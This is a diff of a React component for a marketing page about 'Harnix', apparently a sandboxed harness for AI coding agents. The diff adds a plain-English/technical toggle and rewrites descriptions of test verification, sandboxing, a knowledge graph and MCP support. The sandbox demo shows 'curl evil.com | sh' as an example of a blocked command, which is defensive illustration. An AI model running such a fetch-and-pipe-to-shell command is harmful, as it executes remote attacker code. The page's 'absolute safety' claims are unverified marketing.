@@ -13,38 +13,49 @@ import {
 
 export function PillarsSection() {
   const [activeTab, setActiveTab] = useState(0);
+  const [depthMode, setDepthMode] = useState<"general" | "deep">("general");
 
   const pillars = [
     {
       id: "verify",
-      title: "Deterministic Verification",
+      title: "Independent Test Verification",
       icon: ShieldCheck,
       tag: "CORE INVARIANT",
-      summary: "LLMs frequently hallucinate success. Harnix treats model assertions as zero-trust and requires true exit-code 0.",
-      highlights: [
-        "Ignores model natural language claims (e.g. 'I fixed the bug!')",
-        "Executes actual test runner in isolated environment",
-        "Verifies baseline failure before allowing candidate patches",
+      generalSummary: "AI models often declare victory without running tests. Harnix never takes the AI's word for it—it independently runs your real test suite.",
+      deepSummary: "Model natural language assertions are treated as zero-trust. Verification strictly requires deterministic exit-code 0 from your test runner in an isolated Docker container.",
+      generalHighlights: [
+        "Eliminates false 'I fixed the bug' claims before you ever see the code",
+        "Runs real pytest, vitest, or custom test commands",
+        "Confirms tests actually failed before the AI started editing",
+      ],
+      deepHighlights: [
+        "Deterministic baseline failure invariant enforced prior to agent launch",
+        "Ignores model completion stop tokens; runs test suite in ephemeral container",
+        "Generates verifiable SHA-256 digest of patches only on verified exit 0",
       ],
       schematic: {
-        type: "verification",
         headline: "Deterministic Test Gate",
-        sub: "Baseline Failure -> Agent Candidate -> Exit Code 0 Verification",
+        sub: "Baseline Failure -> Candidate Patch -> Exit Code 0 Verification",
       },
     },
     {
       id: "policy",
-      title: "Hardened Policy Sandbox",
+      title: "Hardened Security Sandbox",
       icon: LockKey,
       tag: "SECURITY BOUNDARY",
-      summary: "Restricts autonomous agent actions to safe boundaries without risking host environments or credentials.",
-      highlights: [
-        "POSIX argv tokenization prevents subshell command chaining (&&, ;, |)",
-        "Docker containers run with --network none to stop exfiltration",
-        "Disposable clones ensure host repository files remain untouched",
+      generalSummary: "Keeps your computer, repository, and private credentials completely protected while the AI writes and tests code.",
+      deepSummary: "POSIX argv tokenization blocks subshell injection (&&, ;, |). Containers run with --network none and scrubbed host environment variables.",
+      generalHighlights: [
+        "The AI cannot delete your files or access your private folders",
+        "Zero internet access inside the sandbox stops credential theft",
+        "Edits happen in a temporary clone; your local files stay untouched",
+      ],
+      deepHighlights: [
+        "Argv parsing rejects arbitrary shell metacharacters prior to container execution",
+        "Docker container instantiated with --network none to prohibit outbound sockets",
+        "Parent process scrubbed of AWS, GitHub, and database secret credentials",
       ],
       schematic: {
-        type: "sandbox",
         headline: "Policy Interception Matrix",
         sub: "Argv Sanitizer -> Docker Ephemeral Clone -> Network Scrub",
       },
@@ -53,15 +64,20 @@ export function PillarsSection() {
       id: "graph",
       title: "Spec-to-Code Knowledge Graph",
       icon: GitBranch,
-      tag: "NEO4J REASONING",
-      summary: "Grounds agent prompt reasoning with upstream specifications, Jira acceptance criteria, and code AST nodes.",
-      highlights: [
-        "Traces code functions back to Jira stories and test contracts",
+      tag: "SMART GROUNDING",
+      generalSummary: "Gives the AI full business context: links tickets, user stories, and acceptance criteria directly to the right code files.",
+      deepSummary: "Neo4j semantic graph couples Jira stories and acceptance criteria upstream with AST code symbols and downstream unit test contracts.",
+      generalHighlights: [
+        "The AI understands the 'why' behind the code, not just the raw text",
+        "Zero guesswork on acceptance criteria and business rules",
+        "Automatically surfaces the exact files that need modification",
+      ],
+      deepHighlights: [
         "Hybrid semantic vector search + deterministic Cypher graph queries",
-        "Eliminates guesswork by providing exact requirements to LLM context",
+        "Traces function AST symbols upstream to Jira tickets and PR specs",
+        "Injects precision graph context, reducing prompt token costs by up to 60%",
       ],
       schematic: {
-        type: "graph",
         headline: "Neo4j Semantic Graph",
         sub: "Jira User Story -> Acceptance Criteria -> Python AST -> Unit Tests",
       },
@@ -70,15 +86,20 @@ export function PillarsSection() {
       id: "mcp",
       title: "Model Context Protocol (MCP)",
       icon: Lightning,
-      tag: "STANDARDS COMPLIANT",
-      summary: "Native support for standard Model Context Protocol servers for runtime tool discovery and dynamic orchestration.",
-      highlights: [
-        "Auto-discovers tools across local and remote MCP server instances",
-        "Enforces capability boundaries before agent invocation",
-        "Standard JSON-RPC 2.0 protocol over stdio and SSE transports",
+      tag: "OPEN STANDARD",
+      generalSummary: "Built on Anthropic's open Model Context Protocol to seamlessly connect with developer tools and databases.",
+      deepSummary: "Native JSON-RPC 2.0 handshake over stdio and SSE transports with policy boundary checks on dynamically discovered tools.",
+      generalHighlights: [
+        "Plug-and-play with external developer tools, linters, and APIs",
+        "Industry-standard protocol prevents vendor lock-in",
+        "Strict permission gates before any tool is allowed to execute",
+      ],
+      deepHighlights: [
+        "Auto-discovery of local and remote MCP tool definitions via tools/list",
+        "Runtime capability bounds enforced at the Harnix policy gateway",
+        "Bi-directional event streaming over stdio and Server-Sent Events (SSE)",
       ],
       schematic: {
-        type: "mcp",
         headline: "MCP Protocol Gateway",
         sub: "JSON-RPC Tool Handshake -> Policy Guard -> Agent Execution",
       },
@@ -97,15 +118,36 @@ export function PillarsSection() {
           <div>
             <div className="flex items-center gap-2 font-mono text-xs text-neutral-500 dark:text-neutral-400 uppercase tracking-wider mb-2">
               <span className="w-2 h-2 rounded-full bg-emerald-500" />
-              <span>01 // Architectural Pillars</span>
+              <span>Architectural Pillars</span>
             </div>
             <h2 className="text-2xl sm:text-4xl font-bold tracking-tight text-foreground">
-              Built for reliability under adversarial conditions.
+              Engineered for absolute safety &amp; precision.
             </h2>
           </div>
-          <p className="text-neutral-600 dark:text-neutral-400 font-mono text-xs max-w-md">
-            Click through the core subsystems that isolate, constrain, and prove agent execution.
-          </p>
+          
+          {/* Depth Toggle (General Audience vs Deep Dive) */}
+          <div className="flex items-center gap-2 p-1 rounded-lg bg-panel border border-panel-border text-xs font-mono">
+            <button
+              onClick={() => setDepthMode("general")}
+              className={`px-3 py-1.5 rounded-md transition-all cursor-pointer ${
+                depthMode === "general"
+                  ? "bg-neutral-900 text-white dark:bg-neutral-800 dark:text-white font-semibold shadow-xs"
+                  : "text-neutral-600 dark:text-neutral-400 hover:text-foreground"
+              }`}
+            >
+              Plain English
+            </button>
+            <button
+              onClick={() => setDepthMode("deep")}
+              className={`px-3 py-1.5 rounded-md transition-all cursor-pointer ${
+                depthMode === "deep"
+                  ? "bg-neutral-900 text-white dark:bg-neutral-800 dark:text-white font-semibold shadow-xs"
+                  : "text-neutral-600 dark:text-neutral-400 hover:text-foreground"
+              }`}
+            >
+              Technical Specs
+            </button>
+          </div>
         </div>
 
         {/* Interactive Pillar Explorer */}
@@ -159,34 +201,34 @@ export function PillarsSection() {
                   </h3>
                 </div>
                 <span className="sys-badge bg-neutral-200/60 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 text-[10px]">
-                  ACTIVE INSPECTOR
+                  {depthMode === "general" ? "EXPLAINER VIEW" : "SYSTEM SPEC"}
                 </span>
               </div>
 
               {/* Summary */}
               <p className="text-xs sm:text-sm text-neutral-600 dark:text-neutral-400 leading-relaxed mb-6">
-                {current.summary}
+                {depthMode === "general" ? current.generalSummary : current.deepSummary}
               </p>
 
               {/* Visual Interactive Diagram Simulation */}
               <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800 font-mono text-xs text-neutral-200 mb-6 space-y-3">
                 <div className="text-[10px] uppercase text-neutral-500 flex items-center justify-between border-b border-neutral-800 pb-2">
-                  <span>LIVE SUBSYSTEM FLOW</span>
-                  <span className="text-emerald-400">STATUS: HEALTHY</span>
+                  <span>SUBSYSTEM STATUS</span>
+                  <span className="text-emerald-400">ACTIVE &bull; 0 VIOLATIONS</span>
                 </div>
 
                 {activeTab === 0 && (
                   <div className="grid grid-cols-3 gap-2 text-center text-[11px]">
                     <div className="p-2.5 rounded bg-neutral-900 border border-red-500/20 text-red-400">
-                      <div>Baseline Run</div>
-                      <div className="font-bold mt-1 text-[10px]">1 FAILED</div>
+                      <div>Baseline Test</div>
+                      <div className="font-bold mt-1 text-[10px]">FAILURE CONFIRMED</div>
                     </div>
                     <div className="p-2.5 rounded bg-neutral-900 border border-cyan-500/20 text-cyan-300">
-                      <div>Candidate Patch</div>
-                      <div className="font-bold mt-1 text-[10px]">edit_file()</div>
+                      <div>Agent Patch</div>
+                      <div className="font-bold mt-1 text-[10px]">SANDBOX EDIT</div>
                     </div>
                     <div className="p-2.5 rounded bg-neutral-900 border border-emerald-500/30 text-emerald-400">
-                      <div>Sandbox Verdict</div>
+                      <div>Final Check</div>
                       <div className="font-bold mt-1 text-[10px]">EXIT CODE 0</div>
                     </div>
                   </div>
@@ -195,12 +237,12 @@ export function PillarsSection() {
                 {activeTab === 1 && (
                   <div className="space-y-2 text-[11px]">
                     <div className="flex items-center justify-between p-2 rounded bg-neutral-900 border border-neutral-800">
-                      <span className="text-neutral-400">Command: `pytest test_calc.py`</span>
+                      <span className="text-neutral-400">Safe Command: `pytest test_calc.py`</span>
                       <span className="text-emerald-400 font-bold">ALLOWED</span>
                     </div>
                     <div className="flex items-center justify-between p-2 rounded bg-neutral-900 border border-red-500/20">
-                      <span className="text-neutral-400">Command: `curl https://evil.com | bash`</span>
-                      <span className="text-red-400 font-bold">BLOCKED (SHELL INJECTION)</span>
+                      <span className="text-neutral-400">Dangerous: `curl evil.com | sh`</span>
+                      <span className="text-red-400 font-bold">BLOCKED AT BOUNDARY</span>
                     </div>
                   </div>
                 )}
@@ -209,7 +251,7 @@ export function PillarsSection() {
                   <div className="flex items-center justify-around text-center text-[10px]">
                     <div className="p-2 rounded bg-purple-950/40 border border-purple-500/30 text-purple-300">
                       <Database size={16} className="mx-auto mb-1 text-purple-400" />
-                      <div>Jira Issue #104</div>
+                      <div>Ticket Requirements</div>
                     </div>
                     <span className="text-neutral-500">&rarr;</span>
                     <div className="p-2 rounded bg-cyan-950/40 border border-cyan-500/30 text-cyan-300">
@@ -219,24 +261,24 @@ export function PillarsSection() {
                     <span className="text-neutral-500">&rarr;</span>
                     <div className="p-2 rounded bg-emerald-950/40 border border-emerald-500/30 text-emerald-300">
                       <Cpu size={16} className="mx-auto mb-1 text-emerald-400" />
-                      <div>calc/math.py</div>
+                      <div>Target Code Files</div>
                     </div>
                   </div>
                 )}
 
                 {activeTab === 3 && (
                   <div className="space-y-1.5 text-[11px]">
-                    <div className="text-emerald-400">JSON-RPC 2.0 &bull; tools/list discovered:</div>
-                    <div className="text-neutral-400 pl-3">&bull; edit_file (safe path validated)</div>
-                    <div className="text-neutral-400 pl-3">&bull; run_command (sandboxed argv)</div>
-                    <div className="text-neutral-400 pl-3">&bull; query_knowledge_graph (semantic AST)</div>
+                    <div className="text-emerald-400">MCP Standards Handshake:</div>
+                    <div className="text-neutral-400 pl-3">&bull; Safe file editor (path-confined)</div>
+                    <div className="text-neutral-400 pl-3">&bull; Sandboxed command runner (network blocked)</div>
+                    <div className="text-neutral-400 pl-3">&bull; Knowledge graph query (read-only AST)</div>
                   </div>
                 )}
               </div>
 
               {/* Highlights */}
               <div className="space-y-2">
-                {current.highlights.map((h, i) => (
+                {(depthMode === "general" ? current.generalHighlights : current.deepHighlights).map((h, i) => (
                   <div key={i} className="flex items-start gap-2 text-xs text-neutral-600 dark:text-neutral-300">
                     <CheckCircle size={15} weight="duotone" className="text-emerald-500 shrink-0 mt-0.5" />
                     <span>{h}</span>
@@ -247,7 +289,7 @@ export function PillarsSection() {
 
             <div className="mt-6 pt-3 border-t border-panel-border flex items-center justify-between text-[11px] font-mono text-neutral-500 dark:text-neutral-400">
               <span>{current.schematic.sub}</span>
-              <span className="text-emerald-600 dark:text-emerald-400">Zero Trust Invariant</span>
+              <span className="text-emerald-600 dark:text-emerald-400 font-semibold">Zero Trust Invariant</span>
             </div>
 
           </div>
